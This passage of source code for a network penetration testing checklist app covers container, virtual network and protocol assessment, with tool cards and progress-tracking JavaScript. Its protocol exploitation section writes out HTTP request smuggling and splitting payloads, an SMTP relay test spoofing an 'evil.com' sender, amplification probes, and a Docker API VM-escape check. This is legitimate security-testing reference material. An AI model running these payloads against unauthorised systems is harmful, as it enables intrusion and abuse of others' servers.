kubectl describe node worker-1 | grep -i -a2 -e PodCIDR -e NetworkAddress

# Checking for exposed services
kubectl get services --all-namespaces | grep -v ClusterIP

# Testing egress access from pods
kubectl run internet-test --image=busybox --rm -it -- ping 8.8.8.8

# Examining CNI configuration
kubectl describe daemonset -n kube-system calico-node
kubectl -n kube-system get configmap calico-config -o yaml

# Testing Kubernetes service account access 
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Analyzing Istio service mesh security policies
kubectl get virtualservice,destinationrule,gateway,authorizationpolicy --all-namespaces -o wide

# Testing cluster network isolation
kubectl run -it --rm debug --image=nicolaka/netshoot --overrides='{"spec": {"hostNetwork": true}}' -- /bin/bash
# Then inside the pod:
ping clusterip-of-service
curl -v http://clusterip-of-service:port</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Container Network Interface Testing</h4>
                <p class="technique-description">Evaluating the security of container network isolation and connectivity.</p>
                <ul>
                    <li><strong>Network Namespace Isolation:</strong> Verify container networks are properly isolated</li>
                    <li><strong>Bridge Network Security:</strong> Test default bridge network controls</li>
                    <li><strong>Custom Network Controls:</strong> Evaluate user-defined networks</li>
                    <li><strong>Host Network Mode:</strong> Check for containers using host networking</li>
                    <li><strong>Inter-Container Communication:</strong> Test container-to-container access controls</li>
                    <li><strong>Container Capability Controls:</strong> Verify network capability restrictions</li>
                    <li><strong>Network Filtering:</strong> Test iptables/nftables rules for container traffic</li>
                </ul>
                <pre class="code-block">
# Docker network commands to assess configuration
docker network ls
docker network inspect bridge

# Finding containers using host network
docker ps --format "{{.Names}}: {{.Networks}}" | grep host

# Looking for containers with exposed ports
docker ps --format "{{.Names}}: {{.Ports}}" | grep -v "^[^ ]*: $"

# Testing network isolation between containers
# Start two containers on the same network
docker run -d --name cont1 --network test-net nginx
docker run -d --name cont2 --network test-net nginx

# Test connectivity between them
docker exec -it cont1 ping cont2
docker exec -it cont1 curl -s cont2

# Analyze container capabilities that could affect networking
docker inspect --format '{{.HostConfig.CapAdd}}' container_name

# Checking iptables/nftables rules for container networking
sudo iptables -L -v -n | grep DOCKER
sudo nft list ruleset | grep docker

# Testing container DNS security
docker run --rm alpine nslookup -type=any example.com

# Checking container traffic filtering
docker exec cont1 traceroute 8.8.8.8</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Virtual Network Security Analysis</h4>
                <p class="technique-description">Methods for testing security of virtualized network infrastructure.</p>
                <pre class="code-block">
# VMware ESXi/vSphere vSwitch security checks
esxcli network vswitch standard list
esxcli network vswitch standard policy security get -v vSwitch0

# Checking for promiscuous mode on virtual switches
esxcli network vswitch standard policy security get --vswitch-name=vSwitch0 | grep -i Promiscuous

# Examining virtual distributed switch configs
Get-VDSwitch | Get-VDSecurityPolicy

# KVM/libvirt network inspection
virsh net-list --all
virsh net-dumpxml default

# Checking OVS (Open vSwitch) configuration
ovs-vsctl show
ovs-ofctl dump-flows br0

# Testing VM escape vectors via networking
# From inside a VM, try to access host-only services
curl -v http://x.x.x.x:2375  # Docker API
curl -v http://x.x.x.x:8080  # Potentially exposed management interfaces

# Testing hypervisor NIC security
# Check if VM can enter promiscuous mode
sudo ip link set eth0 promisc on
sudo tcpdump -i eth0 -n not host $(hostname -I)

# Creating tenant isolation bypass tests
# Test if traffic can flow between isolated tenant networks
ping tenant2-vm-ip</pre>
                <p>Key virtualization network security aspects to evaluate:</p>
                <ul>
                    <li>MAC address spoofing protections</li>
                    <li>Forged transmit blocking</li>
                    <li>Promiscuous mode restrictions</li>
                    <li>Network isolation between tenant VMs</li>
                    <li>Management network segregation</li>
                    <li>Virtual network encryption</li>
                    <li>Layer 2 isolation techniques</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Container Orchestration Network Access Control Testing</h4>
                <p class="technique-description">Evaluating network security in container orchestration environments.</p>
                <pre class="code-block">
# Testing Kubernetes NetworkPolicy enforcement
# Create a default deny policy
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF

# Then try to access services to verify blocking
kubectl run test --image=busybox --rm -it -- wget -q -O- http://service-name

# Testing for Kubernetes API server access
kubectl run test --image=curlimages/curl --rm -it -- curl -k https://kubernetes.default.svc

# Evaluating Istio Authorization Policies
# Find running services under Istio
kubectl get svc -n istio-system
# Test mTLS enforcement
istioctl x describe pod test-pod -n default

# Testing egress gateway controls
kubectl exec -it test-pod -c app -- curl -I https://www.google.com

# Analyzing Calico network policy effectiveness
calicoctl get networkpolicy --all-namespaces
calicoctl get globalnetworkpolicy</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-ship tool-icon"></i>
                    <h4 class="tool-title">kube-hunter</h4>
                </div>
                <p class="tool-description">Kubernetes security assessment tool that hunts for security issues in Kubernetes clusters, including network security.</p>
                <a href="https://github.com/aquasecurity/kube-hunter" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-box-open tool-icon"></i>
                    <h4 class="tool-title">Cilium Hubble</h4>
                </div>
                <p class="tool-description">Network and security observability platform for Kubernetes, allowing visual analysis of network flows.</p>
                <a href="https://github.com/cilium/hubble" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-shield-alt tool-icon"></i>
                    <h4 class="tool-title">Kubeaudit</h4>
                </div>
                <p class="tool-description">Tool for auditing Kubernetes clusters for security concerns, including network policy configurations.</p>
                <a href="https://github.com/Shopify/kubeaudit" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-network-wired tool-icon"></i>
                    <h4 class="tool-title">nsenter</h4>
                </div>
                <p class="tool-description">Linux tool for entering network namespaces, useful for container network security testing.</p>
                <a href="https://man7.org/linux/man-pages/man1/nsenter.1.html" target="_blank" class="tool-link">
                    <span>Manual</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-cube tool-icon"></i>
                    <h4 class="tool-title">Docker Bench Security</h4>
                </div>
                <p class="tool-description">Script to audit Docker containers and hosts for security best practices, including network security.</p>
                <a href="https://github.com/docker/docker-bench-security" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-project-diagram tool-icon"></i>
                    <h4 class="tool-title">Istioctl</h4>
                </div>
                <p class="tool-description">Command-line utility for managing and debugging Istio service mesh security configurations.</p>
                <a href="https://istio.io/latest/docs/ops/diagnostic-tools/istioctl/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'protocol-analysis': {
        title: '12. Network Protocol Analysis',
        subtitle: 'In-depth evaluation of network protocol implementations and security',
        priority: 'medium',
        icon: '<i class="fas fa-exchange-alt" style="color: var(--secondary);"></i>',
        checklistItems: [
            { groupTitle: '12.1 Protocol Security Assessment' },
            { id: '12.1.1', text: 'Analyze implementation of common protocols (HTTP, DNS, SMTP, etc.)' },
            { id: '12.1.2', text: 'Test for protocol downgrade vulnerabilities' },
            { id: '12.1.3', text: 'Identify weak cryptographic implementations' },
            { id: '12.1.4', text: 'Assess protocol state machine vulnerabilities' },
            { id: '12.1.5', text: 'Evaluate custom protocol implementations' },
            { id: '12.1.6', text: 'Test protocol timing vulnerabilities' },
            
            { groupTitle: '12.2 Protocol Fuzzing' },
            { id: '12.2.1', text: 'Perform structured protocol fuzzing' },
            { id: '12.2.2', text: 'Test for protocol implementation vulnerabilities' },
            { id: '12.2.3', text: 'Identify buffer overflow vulnerabilities' },
            { id: '12.2.4', text: 'Test for protocol parsing issues' },
            { id: '12.2.5', text: 'Assess robustness against malformed packets' },
            { id: '12.2.6', text: 'Generate edge cases for protocol fields' },
            
            { groupTitle: '12.3 Encrypted Traffic Analysis' },
            { id: '12.3.1', text: 'Evaluate TLS/SSL implementation security' },
            { id: '12.3.2', text: 'Test for SSL/TLS vulnerabilities' },
            { id: '12.3.3', text: 'Assess certificate validation' },
            { id: '12.3.4', text: 'Test encrypted traffic inspection mechanisms' },
            { id: '12.3.5', text: 'Evaluate perfect forward secrecy implementation' },
            { id: '12.3.6', text: 'Assess cryptographic algorithm selection' },
            
            { groupTitle: '12.4 Protocol Exploitation' },
            { id: '12.4.1', text: 'Test for protocol reflection/amplification vulnerabilities' },
            { id: '12.4.2', text: 'Evaluate susceptibility to MITM attacks' },
            { id: '12.4.3', text: 'Assess protocol authentication bypass possibilities' },
            { id: '12.4.4', text: 'Test for replay attack vulnerabilities' },
            { id: '12.4.5', text: 'Document protocol vulnerabilities and implementation flaws' },
            { id: '12.4.6', text: 'Evaluate protocol extension security' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Protocol Fuzzing Techniques</h4>
                <p class="technique-description">Methods for safely testing network protocol implementations for vulnerabilities.</p>
                <pre class="code-block">
# Basic HTTP fuzzing with OWASP ZAP
zap-cli quick-scan -s xss,sqli -r -t http://target.com/

# DNS protocol fuzzing with dnsfuzzer
./dnsfuzzer 10.0.0.5

# SNMP fuzzing with PROTOS test suite
java -jar protos-snmp.jar 10.0.0.5 161

# TLS/SSL protocol fuzzing with tlsfuzzer
python3 -m tlsfuzzer.tlsfuzzer -h 10.0.0.5 -p 443 all

# Custom protocol fuzzing with Boofuzz
python3
from boofuzz import *

session = Session(target=Target(connection=TCPSocketConnection("10.0.0.5", 502)))
s_initialize("modbus_request")
s_byte(0x00)  # Transaction ID (High)
s_byte(0x01)  # Transaction ID (Low)
s_byte(0x00)  # Protocol ID (High)
s_byte(0x00)  # Protocol ID (Low)
s_byte(0x00)  # Length (High)
s_byte(0x06)  # Length (Low)
s_byte(0x01)  # Unit ID
s_byte(0x03)  # Function Code
s_word(0x0000)  # Starting Address
s_word(0x0001)  # Quantity

session.connect(s_get("modbus_request"))
session.fuzz()

# Advanced fuzzing with Radamsa
# Generate 100 malformed versions of a valid packet
radamsa -n 100 -o output-%n.bin valid_packet.bin

# MQTT protocol fuzzing with MQTT-Fuzzing
python3 mqtt-fuzzing.py -b mqtt.broker.address -p 1883 -t test/topic -c 100

# Fuzzing RPC services with RPCfuzz
./rpcfuzz -t 10.0.0.5 -p 111</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">TLS/SSL Security Assessment</h4>
                <p class="technique-description">Comprehensive evaluation of TLS/SSL implementations.</p>
                <ul>
                    <li><strong>Protocol Version Testing:</strong> Check for deprecated versions (SSL 2.0/3.0, TLS 1.0/1.1)</li>
                    <li><strong>Cipher Suite Analysis:</strong> Identify weak, insecure, or deprecated ciphers</li>
                    <li><strong>Certificate Validation:</strong> Test hostname validation, revocation checking, trust chains</li>
                    <li><strong>Known Vulnerability Testing:</strong> Check for BEAST, POODLE, Heartbleed, FREAK, DROWN, etc.</li>
                    <li><strong>Perfect Forward Secrecy:</strong> Verify PFS implementation with appropriate key exchange</li>
                    <li><strong>HSTS Implementation:</strong> Verify HTTP Strict Transport Security headers</li>
                    <li><strong>Certificate Transparency:</strong> Verify SCT inclusion for enhanced trust validation</li>
                </ul>
                <pre class="code-block">
# Comprehensive TLS/SSL testing with testssl.sh
testssl.sh --all 10.0.0.5:443

# Testing for specific vulnerabilities
testssl.sh -U --heartbleed --beast --lucky13 --freak --logjam 10.0.0.5:443

# Assessing cipher suites with nmap
nmap --script ssl-enum-ciphers -p 443 10.0.0.5

# Testing certificate validation with OpenSSL
openssl s_client -connect 10.0.0.5:443 -servername example.com

# Checking for SSL/TLS misconfigurations
sslscan --no-failed 10.0.0.5:443

# Testing certificate revocation
openssl s_client -connect 10.0.0.5:443 -status

# Testing for TLS 1.3 support
openssl s_client -connect 10.0.0.5:443 -tls1_3

# Testing for insecure renegotiation
openssl s_client -connect 10.0.0.5:443 -tls1_2 | grep "Secure Renegotiation"</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Custom Protocol Reverse Engineering</h4>
                <p class="technique-description">Methods for analyzing and testing proprietary or undocumented protocols.</p>
                <pre class="code-block">
# Capturing traffic for analysis
tcpdump -i eth0 -w protocol.pcap host 10.0.0.5 and port 12345

# Advanced protocol analysis with Wireshark display filters
wireshark -r protocol.pcap -Y "tcp.port == 12345"

# Using tshark for pattern identification
tshark -r protocol.pcap -T fields -e data | grep -v "^$" | sort | uniq -c | sort -nr

# Interacting with the protocol using netcat
nc -v 10.0.0.5 12345

# Protocol reverse engineering with Netzob
from netzob.all import *
messages = PCAPImporter.readFile("protocol.pcap").values()
symbol = Symbol(messages=messages)
Format.splitDelimiter(symbol, ASCII(" "))
symbol.addEncodingFunction(TypeEncodingFunction(HexaString))
print(symbol)

# Statistical analysis of protocol fields
Alignment.align(symbol)
Distribution.getFieldsDistribution(symbol)

# Protocol state machine inference with PRISMA
prisma trace-to-fsm protocol.pcap 12345

# Binary protocol reverse engineering with binwalk
binwalk -B packet_sample.bin</pre>
                <p>Protocol analysis methodology:</p>
                <ol>
                    <li>Initial traffic capture in controlled environment</li>
                    <li>Message structure identification (headers, fields, delimiters)</li>
                    <li>State machine mapping (request/response patterns)</li>
                    <li>Field validation and boundary testing</li>
                    <li>Authentication/encryption analysis</li>
                    <li>Systematic fuzzing based on protocol structure</li>
                    <li>Timing and race condition testing</li>
                </ol>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Protocol Exploitation Techniques</h4>
                <p class="technique-description">Methods for identifying and exploiting common protocol vulnerabilities.</p>
                <pre class="code-block">
# Testing DNS amplification potential
dig @10.0.0.5 test.com ANY +dnssec

# Testing for SMTP open relay
telnet 10.0.0.5 25
HELO test.com
MAIL FROM: attacker@evil.com
RCPT TO: victim@target.com
DATA
Subject: Test Message
Test message body
.
QUIT

# Testing for NTP amplification
ntpdc -n -c monlist 10.0.0.5

# Testing for HTTP request smuggling
echo -e "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Testing for protocol downgrade in HTTPS
openssl s_client -connect target.com:443 -no_tls1_3 -no_tls1_2

# Testing STARTTLS stripping in SMTP
nc -v target.com 25
EHLO test.com
# Check if server advertises STARTTLS
# If yes, test if it accepts commands before STARTTLS

# Testing for HTTP request splitting
curl -i -s -k -X 'GET' -H 'Host: target.com' -H 'User-Agent: Mozilla/5.0' -H $'X-Header: Value\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' 'https://target.com/'</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-wave-square tool-icon"></i>
                    <h4 class="tool-title">Wireshark</h4>
                </div>
                <p class="tool-description">Network protocol analyzer with deep inspection capabilities for hundreds of protocols.</p>
                <a href="https://www.wireshark.org/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-bug tool-icon"></i>
                    <h4 class="tool-title">Boofuzz</h4>
                </div>
                <p class="tool-description">Network protocol fuzzing framework for discovering vulnerabilities in protocol implementations.</p>
                <a href="https://github.com/jtpereyda/boofuzz" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-lock tool-icon"></i>
                    <h4 class="tool-title">testssl.sh</h4>
                </div>
                <p class="tool-description">Comprehensive tool for testing SSL/TLS implementations and vulnerabilities.</p>
                <a href="https://github.com/drwetter/testssl.sh" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-puzzle-piece tool-icon"></i>
                    <h4 class="tool-title">Netzob</h4>
                </div>
                <p class="tool-description">Tool for protocol reverse engineering, modeling, and fuzzing of communication protocols.</p>
                <a href="https://github.com/netzob/netzob" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-random tool-icon"></i>
                    <h4 class="tool-title">Scapy</h4>
                </div>
                <p class="tool-description">Powerful interactive packet manipulation program for custom protocol crafting and analysis.</p>
                <a href="https://scapy.net/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-microscope tool-icon"></i>
                    <h4 class="tool-title">PRISMA</h4>
                </div>
                <p class="tool-description">Protocol Inspection and State Machine Analysis tool for protocol reverse engineering.</p>
                <a href="https://github.com/securifybv/prisma" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    }
};

























        // --- Global State ---
        let currentCategory = '';
        let currentProject = null; // Will be loaded from storage
        let projects = {};
        let confirmCallback = null;
        let currentEditingFindingId = null;

        // --- Initialization ---
        document.addEventListener('DOMContentLoaded', initApp);

        function initApp() {
            loadProjectsFromStorage(); // Load or create default project
            setupEventListeners();
            updateProjectUI(); // Initial UI update based on loaded project
            renderCategoryCards(); // Render category cards with data from the categories object
            initFindingsTable();
            updateProgressIndicators(); // Calculate and display initial progress
            console.log("Network Penetration Testing Checklist Initialized. Current Project:", currentProject.name);
        }

        // --- Event Listeners Setup ---
        function setupEventListeners() {
            // Modal close buttons
            document.querySelectorAll('.modal-close, [data-dismiss="modal"]').forEach(btn => {
                btn.addEventListener('click', function() {
                    closeModal(this.closest('.modal-overlay'));
                });
            });

            // Back button
            document.getElementById('btn-back').addEventListener('click', function(e) {
                e.preventDefault();
                closeCategory();
            });

            // Tab navigation
            document.querySelectorAll('.tab-link').forEach(tab => {
                tab.addEventListener('click', function(e) {
                    e.preventDefault();
                    const tabName = this.getAttribute('data-tab');
                    changeTab(tabName);
                });
            });

            // Project management buttons
            document.getElementById('btn-projects').addEventListener('click', function() {
                openProjectsModal();
            });

            document.getElementById('btn-edit-project').addEventListener('click', function() {
                editProject();
            });

            document.getElementById('btn-save-project').addEventListener('click', function() {
                saveProjectDetails();
            });

            document.getElementById('btn-new-project').addEventListener('click', function() {
                openNewProjectModal();
            });

            document.getElementById('btn-create-project').addEventListener('click', function() {
                createNewProject();
            });

            // Findings management
            document.getElementById('btn-add-finding').addEventListener('click', function() {
                addFinding();
            });

            document.getElementById('btn-save-finding').addEventListener('click', function() {
                saveFinding();
            });

            document.getElementById('btn-save-notes').addEventListener('click', function() {
                saveNotes();
            });

            // Export/Import buttons
            document.getElementById('btn-export').addEventListener('click', function() {
                exportProject();
            });

            document.getElementById('btn-import').addEventListener('click', function() {
                openImportModal();
            });

            // Print button
            document.getElementById('btn-print').addEventListener('click', function() {
                printChecklist();
            });

            // Report button
            document.getElementById('btn-generate-report').addEventListener('click', function() {
                generateReport();
            });

            // Confirm dialog
            document.getElementById('confirm-yes').addEventListener('click', function() {
                if (confirmCallback) {
                    confirmCallback();
                    confirmCallback = null;
                }
                closeModal(document.getElementById('confirm-modal'));
            });

            // Escape key for modals
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    document.querySelectorAll('.modal-overlay').forEach(modal => {
                        if (modal.classList.contains('active')) {
                            closeModal(modal);
                        }
                    });
                }
            });

            // Delegated event listener for status buttons
            document.addEventListener('click', function(e) {
                // Handle task status buttons
                if (e.target.classList.contains('status-btn')) {
                    const statusBtn = e.target;
                    const taskItem = statusBtn.closest('.task-item');
                    if (taskItem) {
                        const taskId = taskItem.getAttribute('data-task-id');
                        const status = statusBtn.getAttribute('data-status');
                        updateTaskStatus(taskId, status);
                    }
                }
                // Handle category cards
                else if (e.target.closest('.category-card')) {
                    const card = e.target.closest('.category-card');
                    const categoryId = card.getAttribute('data-category');
                    if (categoryId) {
                        openCategory(categoryId);
                    }
                }
            });
        }

        // --- Category Management ---

        function renderCategoryCards() {
            const container = document.getElementById('categories-section').querySelector('.categories-grid');
            if (!container) return;

            container.innerHTML = '';

            Object.entries(categories).forEach(([id, category]) => {
                const completionPercent = calculateCategoryCompletion(id);
                const card = document.createElement('div');
                card.className = 'category-card';
                card.setAttribute('data-category', id);
                
                card.innerHTML = `
                    <div class="priority-${category.priority}">${category.priority} Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                ${category.icon}
                            </div>
                            <h3 class="category-title">${category.title}</h3>
                        </div>
                        <p class="category-description">${category.subtitle}</p>
                        <div class="category-footer">
                            <span class="category-progress" id="${id}-progress">${completionPercent}% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                `;
                
                container.appendChild(card);
            });
        }

        function calculateCategoryCompletion(categoryId) {
            if (!categories[categoryId] || !categories[categoryId].checklistItems) {
                return 0;
            }

            let totalTasks = 0;
            let completedTasks = 0;
            let naTasks = 0;

            categories[categoryId].checklistItems.forEach(item => {
                if (item.id) {
                    totalTasks++;
                    const status = currentProject.taskStatus?.[item.id] || TASK_STATUS.NOT_TESTED;
                    if (status === TASK_STATUS.PASSED) {
                        completedTasks++;
                    } else if (status === TASK_STATUS.NA) {
                        naTasks++;
                    }
                }
            });

            // Calculate percentage excluding N/A tasks
            const applicableTasks = totalTasks - naTasks;
            if (applicableTasks === 0) return 0;
            return Math.round((completedTasks / applicableTasks) * 100);
        }

        function openCategory(categoryId) {
            if (!categories[categoryId]) return;
            
            currentCategory = categoryId;
            const category = categories[categoryId];
            
            // Update header
            document.getElementById('details-title').textContent = category.title;
            document.getElementById('details-subtitle').textContent = category.subtitle;
            
            // Generate checklist content
            const checklistContent = document.getElementById('checklist-tab');
            if (checklistContent) {
                checklistContent.innerHTML = generateChecklistHTML(category.checklistItems);
            }
            
            // Load techniques content
            const techniquesContent = document.getElementById('techniques-tab');
            if (techniquesContent) {
                techniquesContent.innerHTML = category.techniquesHTML || '<p>No techniques documented for this category.</p>';
            }
            
            // Load tools content
            const toolsContent = document.getElementById('tools-tab');
            if (toolsContent) {
                toolsContent.innerHTML = category.toolsHTML || '<p>No tools documented for this category.</p>';
            }
            
            // Load notes
            const notesTextarea = document.getElementById('category-notes');
            if (notesTextarea) {
                notesTextarea.value = currentProject.notes?.[categoryId] || '';
            }
            
            // Apply saved task statuses
            applyTaskStatuses();
            
            // Show category details and scroll to it
            document.getElementById('categories-section').style.display = 'none';
            document.getElementById('category-details').style.display = 'block';
            window.scrollTo(0, 0);
            
            // Set active tab to checklist
            changeTab('checklist');
        }

        function closeCategory() {
            document.getElementById('categories-section').style.display = 'block';
            document.getElementById('category-details').style.display = 'none';
            currentCategory = '';
        }

        function generateChecklistHTML(items) {
            if (!items || !items.length) {
                return '<p>No checklist items found for this category.</p>';
            }

            let html = '';
            let currentGroupOpen = false;

            items.forEach(item => {
                if (item.groupTitle) {
                    if (currentGroupOpen) {
                        html += '</div>';
                    }
                    html += `
                        <div class="checklist-group">
                            <h3 class="checklist-group-title">${item.groupTitle}</h3>
                    `;
                    currentGroupOpen = true;
                } else if (item.id && item.text) {
                    html += `
                        <div class="task-item" data-task-id="${item.id}">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn" data-status="${TASK_STATUS.NOT_TESTED}" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="${TASK_STATUS.PASSED}" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="${TASK_STATUS.NA}" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">${item.text}</div>
                        </div>
                    `;
                }
            });

            if (currentGroupOpen) {
                html += '</div>';
            }

            return html;
        }

        function applyTaskStatuses() {
            document.querySelectorAll('.task-item').forEach(taskItem => {
                const taskId = taskItem.getAttribute('data-task-id');
                if (!taskId || !currentProject.taskStatus) return;

                const status = currentProject.taskStatus[taskId] || TASK_STATUS.NOT_TESTED;
                
                // Clear active status from all buttons
                taskItem.querySelectorAll('.status-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                
                // Set active status to the correct button
                const activeButton = taskItem.querySelector(`.status-btn[data-status="${status}"]`);
                if (activeButton) {
                    activeButton.classList.add('active');
                }
            });
        }

        function updateTaskStatus(taskId, status) {
            if (!taskId || !status || !currentProject) return;
            
            // Initialize taskStatus if it doesn't exist
            if (!currentProject.taskStatus) {
                currentProject.taskStatus = {};
            }
            
            // Update the task status
            currentProject.taskStatus[taskId] = status;
            
            // Update UI - set the correct button as active
            document.querySelectorAll(`.task-item[data-task-id="${taskId}"] .status-btn`).forEach(btn => {
                btn.classList.remove('active');
                if (btn.getAttribute('data-status') === status) {
                    btn.classList.add('active');
                }
            });
            
            // Save project and update progress indicators
            saveProjectToStorage();
            updateProgressIndicators();
        }

        function changeTab(tabName) {
            // Remove active class from all tabs and contents
            document.querySelectorAll('.tab-link').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            // Add active class to selected tab and content
            const selectedTab = document.querySelector(`.tab-link[data-tab="${tabName}"]`);
            const selectedContent = document.getElementById(`${tabName}-tab`);
            
            if (selectedTab && selectedContent) {
                selectedTab.classList.add('active');
                selectedContent.classList.add('active');
            }
        }

        // --- Progress Tracking ---

        function updateProgressIndicators() {
            // Calculate overall progress
            let totalTasks = 0;
            let completedTasks = 0;
            let naTasks = 0;
            
            // Count by priority
            let criticalTasks = { total: 0, completed: 0, na: 0 };
            let highTasks = { total: 0, completed: 0, na: 0 };
            let mediumTasks = { total: 0, completed: 0, na: 0 };
            
            Object.entries(categories).forEach(([catId, category]) => {
                if (!category.checklistItems) return;
                
                const priority = category.priority;
                
                category.checklistItems.forEach(item => {
                    if (!item.id) return;
                    
                    totalTasks++;
                    
                    // Track by priority
                    if (priority === 'critical') criticalTasks.total++;
                    else if (priority === 'high') highTasks.total++;
                    else if (priority === 'medium') mediumTasks.total++;
                    
                    const status = currentProject.taskStatus?.[item.id] || TASK_STATUS.NOT_TESTED;
                    
                    if (status === TASK_STATUS.PASSED) {
                        completedTasks++;
                        
                        // Track completed by priority
                        if (priority === 'critical') criticalTasks.completed++;
                        else if (priority === 'high') highTasks.completed++;
                        else if (priority === 'medium') mediumTasks.completed++;
                    } 
                    else if (status === TASK_STATUS.NA) {
                        naTasks++;
                        
                        // Track N/A by priority
                        if (priority === 'critical') criticalTasks.na++;
                        else if (priority === 'high') highTasks.na++;
                        else if (priority === 'medium') mediumTasks.na++;
                    }
                });
            });
            
            // Update overall progress
            const applicableTasks = totalTasks - naTasks;
            const overallPercent = applicableTasks > 0 ? Math.round((completedTasks / applicableTasks) * 100) : 0;
            
            document.getElementById('overall-progress').textContent = `${overallPercent}%`;
            document.getElementById('overall-progress-bar').style.width = `${overallPercent}%`;
            
            // Update critical progress
            const criticalApplicable = criticalTasks.total - criticalTasks.na;
            const criticalPercent = criticalApplicable > 0 ? Math.round((criticalTasks.completed / criticalApplicable) * 100) : 0;
            
            document.getElementById('critical-progress').textContent = `${criticalTasks.completed}/${criticalApplicable}`;
            document.getElementById('critical-progress-bar').style.width = `${criticalPercent}%`;
            
            // Update high progress
            const highApplicable = highTasks.total - highTasks.na;
            const highPercent = highApplicable > 0 ? Math.round((highTasks.completed / highApplicable) * 100) : 0;
            
            document.getElementById('high-progress').textContent = `${highTasks.completed}/${highApplicable}`;
            document.getElementById('high-progress-bar').style.width = `${highPercent}%`;
            
            // Update medium progress
            const mediumApplicable = mediumTasks.total - mediumTasks.na;
            const mediumPercent = mediumApplicable > 0 ? Math.round((mediumTasks.completed / mediumApplicable) * 100) : 0;
            
            document.getElementById('medium-progress').textContent = `${mediumTasks.completed}/${mediumApplicable}`;
            document.getElementById('medium-progress-bar').style.width = `${mediumPercent}%`;
            
            // Update category progress indicators
            Object.keys(categories).forEach(categoryId => {
                const progressElement = document.getElementById(`${categoryId}-progress`);
                if (progressElement) {
                    const percent = calculateCategoryCompletion(categoryId);
                    progressElement.textContent = `${percent}% complete`;
                }
            });
            
            // Update last updated timestamp
            currentProject.lastUpdated = new Date().toISOString();
            document.getElementById('project-updated').textContent = formatDate(currentProject.lastUpdated);
        }

        // --- Notes Management ---

        function saveNotes() {
            if (!currentCategory || !currentProject) return;
            
            const notesTextarea = document.getElementById('category-notes');
            if (!notesTextarea) return;
            
            // Initialize notes object if it doesn't exist
            if (!currentProject.notes) {
                currentProject.notes = {};
            }
            
            // Save notes for current category
            currentProject.notes[currentCategory] = notesTextarea.value;
            
            // Save project
            saveProjectToStorage();
            showToast('Notes saved successfully', 'success');
        }

        // --- Finding Management ---

        function initFindingsTable() {
            const tableBody = document.getElementById('findings-table-body');
            if (!tableBody) return;
            
            tableBody.innerHTML = '';
            
            // Ensure findingDetails exists
            if (!currentProject.findingDetails) {
                currentProject.findingDetails = [];
            }
            
            // Organize findings by category
            const findingsByCategory = {};
            
            // Initialize with all categories
            Object.keys(categories).forEach(catId => {
                findingsByCategory[catId] = [];
            });
            
